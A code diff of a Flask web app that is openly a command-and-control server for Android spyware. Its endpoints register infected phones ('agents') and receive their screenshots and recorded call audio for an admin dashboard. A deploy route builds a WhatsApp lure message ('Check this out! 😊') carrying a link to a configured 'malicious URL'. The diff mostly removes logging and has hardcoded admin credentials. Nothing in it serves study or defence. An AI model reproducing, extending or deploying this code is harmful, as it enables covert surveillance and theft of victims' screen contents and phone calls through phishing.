@@ -2,28 +2,30 @@ from flask import Flask, request, jsonify, session, redirect, render_template, R
 import sqlite3
 from datetime import datetime
 import os
-import requests
 
 app = Flask(__name__)
-app.secret_key = 'mp_agent_secure_key_2024_render'
+app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_secure_key_2024_render')
 app.template_folder = 'templates'
 
 # Admin credentials
 ADMIN_USERNAME = "Mpc"
 ADMIN_PASSWORD = "0220Mpc"
 
-# Dynamic server URLs - will be set from environment or request
-def get_c2_url():
-    return request.host_url.rstrip('/')
-
-def get_malicious_url():
-    # This will be set after deployment
-    return os.environ.get('MALICIOUS_URL', '')
-
 def get_db_connection():
     conn = sqlite3.connect('mp_agent.db')
     conn.row_factory = sqlite3.Row
     return conn
+
+def get_c2_url():
+    return request.host_url.rstrip('/')
+
+def get_malicious_url():
+    return os.environ.get('MALICIOUS_URL', '')
+
+@app.before_first_request
+def initialize_database():
+    from database import db
+    print("✅ Database initialized")
 
 @app.route('/')
 def index():
@@ -40,17 +42,6 @@ def login():
         if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
             session['authenticated'] = True
             session['username'] = username
-            session['login_time'] = datetime.now().isoformat()
-            
-            # Log the login
-            conn = get_db_connection()
-            conn.execute(
-                'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-                ('INFO', f'Admin login: {username}', datetime.now())
-            )
-            conn.commit()
-            conn.close()
-            
             return redirect('/dashboard')
         else:
             return '''
@@ -102,12 +93,12 @@ def dashboard():
     
     # Get statistics
     active_agents = conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0]
-    total_screenshots = conn.execute("SELECT COUNT(*) FROM screenshots").fetchall()[0][0]
+    total_screenshots = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
     total_calls = conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0]
     total_deployments = conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
     
     # Get recent data
-    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC").fetchall()
+    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 10").fetchall()
     screenshots = conn.execute('''
         SELECT s.*, a.phone_model FROM screenshots s 
         JOIN agents a ON s.agent_id = a.agent_id 
@@ -134,7 +125,6 @@ def dashboard():
                          c2_url=c2_url,
                          malicious_url=malicious_url)
 
-# API Endpoints for agents
 @app.route('/api/agent/register', methods=['POST'])
 def register_agent():
     try:
@@ -146,44 +136,27 @@ def register_agent():
         
         conn = get_db_connection()
         
-        # Check if agent exists
         existing_agent = conn.execute(
             "SELECT id FROM agents WHERE agent_id = ?", (agent_id,)
         ).fetchone()
         
         if existing_agent:
-            # Update existing agent
             conn.execute(
                 "UPDATE agents SET last_seen = ?, status = 'active' WHERE agent_id = ?",
                 (datetime.now(), agent_id)
             )
-            action = "updated"
         else:
-            # Register new agent
             conn.execute('''
                 INSERT INTO agents (agent_id, phone_model, android_version, ip_address, first_seen, last_seen)
                 VALUES (?, ?, ?, ?, ?, ?)
             ''', (agent_id, phone_model, android_version, ip_address, datetime.now(), datetime.now()))
-            action = "registered"
-        
-        conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('INFO', f'Agent {action}: {agent_id} from {ip_address}', datetime.now())
-        )
         
         conn.commit()
         conn.close()
         
-        return jsonify({'status': 'success', 'message': f'Agent {action} successfully'})
+        return jsonify({'status': 'success', 'message': 'Agent registered'})
         
     except Exception as e:
-        conn = get_db_connection()
-        conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('ERROR', f'Agent registration failed: {str(e)}', datetime.now())
-        )
-        conn.commit()
-        conn.close()
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/upload_screenshot', methods=['POST'])
@@ -193,43 +166,25 @@ def upload_screenshot():
         screenshot_file = request.files.get('screenshot')
         
         if not agent_id or not screenshot_file:
-            return jsonify({'status': 'error', 'message': 'Missing agent_id or screenshot'}), 400
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
         
         screenshot_data = screenshot_file.read()
         
         conn = get_db_connection()
-        
         conn.execute(
             'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
             (agent_id, screenshot_data, datetime.now())
         )
-        
-        conn.execute('''
-            UPDATE agents 
-            SET screenshot_count = screenshot_count + 1, 
-                last_seen = ?,
-                last_screenshot = ?
-            WHERE agent_id = ?
-        ''', (datetime.now(), datetime.now(), agent_id))
-        
         conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('INFO', f'Screenshot uploaded from {agent_id}', datetime.now())
+            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ? WHERE agent_id = ?',
+            (datetime.now(), agent_id)
         )
-        
         conn.commit()
         conn.close()
         
-        return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
+        return jsonify({'status': 'success', 'message': 'Screenshot uploaded'})
         
     except Exception as e:
-        conn = get_db_connection()
-        conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('ERROR', f'Screenshot upload failed: {str(e)}', datetime.now())
-        )
-        conn.commit()
-        conn.close()
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/upload_call', methods=['POST'])
@@ -244,71 +199,48 @@ def upload_call():
         audio_data = audio_file.read() if audio_file else None
         
         conn = get_db_connection()
-        
         conn.execute('''
             INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
             VALUES (?, ?, ?, ?, ?, ?)
         ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
-        
         conn.execute(
             'UPDATE agents SET call_records = call_records + 1, last_seen = ? WHERE agent_id = ?',
             (datetime.now(), agent_id)
         )
-        
-        conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('INFO', f'Call recording from {agent_id}: {call_type} call to {phone_number}', datetime.now())
-        )
-        
         conn.commit()
         conn.close()
         
-        return jsonify({'status': 'success', 'message': 'Call recording uploaded successfully'})
+        return jsonify({'status': 'success', 'message': 'Call recording uploaded'})
         
     except Exception as e:
-        conn = get_db_connection()
-        conn.execute(
-            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-            ('ERROR', f'Call upload failed: {str(e)}', datetime.now())
-        )
-        conn.commit()
-        conn.close()
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# Media serving endpoints
 @app.route('/media/screenshot/<int:screenshot_id>')
 def serve_screenshot(screenshot_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
     conn = get_db_connection()
-    screenshot = conn.execute(
-        "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
-    ).fetchone()
+    screenshot = conn.execute("SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)).fetchone()
     conn.close()
     
     if screenshot and screenshot['screenshot_data']:
         return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
-    
-    return 'Screenshot not found', 404
+    return 'Not found', 404
 
 @app.route('/media/call/<int:call_id>')
-def serve_call_audio(call_id):
+def serve_call(call_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
     conn = get_db_connection()
-    call = conn.execute(
-        "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
-    ).fetchone()
+    call = conn.execute("SELECT audio_data FROM call_records WHERE id = ?", (call_id,)).fetchone()
     conn.close()
     
     if call and call['audio_data']:
         return Response(call['audio_data'], mimetype='audio/mp4')
-    
-    return 'Call recording not found', 404
+    return 'Not found', 404
 
-# Deployment management
 @app.route('/deploy', methods=['POST'])
 def deploy_agent():
     if not session.get('authenticated'):
@@ -319,43 +251,35 @@ def deploy_agent():
     
     malicious_url = get_malicious_url()
     if not malicious_url:
-        return "Malicious server URL not configured. Please set MALICIOUS_URL environment variable.", 500
+        return "Error: Malicious server URL not configured. Please set MALICIOUS_URL environment variable.", 500
     
     malicious_link = f"{malicious_url}/video?phone={agent_id}"
-    whatsapp_message = f"Check this out! 😊 {malicious_link}"
+    message = f"Check this out! 😊 {malicious_link}"
     
     conn = get_db_connection()
     conn.execute(
         'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (target_phone, session.get('username', 'admin'), whatsapp_message, 'initiated', datetime.now())
+        (target_phone, 'admin', message, 'initiated', datetime.now())
     )
-    
-    conn.execute(
-        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-        ('INFO', f'Deployment created for {target_phone} -> {agent_id}', datetime.now())
-    )
-    
     conn.commit()
     conn.close()
     
-    return render_template('deployment.html', 
-                         target_phone=target_phone,
-                         agent_id=agent_id,
-                         malicious_link=malicious_link,
-                         whatsapp_message=whatsapp_message)
+    return f'''
+    <html>
+    <head><title>Deployment Ready</title></head>
+    <body>
+        <h2>✅ Deployment Ready</h2>
+        <p><strong>Send this WhatsApp message:</strong></p>
+        <div style="background: #f0f0f0; padding: 15px; margin: 10px 0;">
+            {message}
+        </div>
+        <p><a href="/dashboard">← Back to Dashboard</a></p>
+    </body>
+    </html>
+    '''
 
 @app.route('/logout')
 def logout():
-    username = session.get('username', 'Unknown')
-    
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-        ('INFO', f'Admin logout: {username}', datetime.now())
-    )
-    conn.commit()
-    conn.close()
-    
     session.clear()
     return redirect('/login')
 
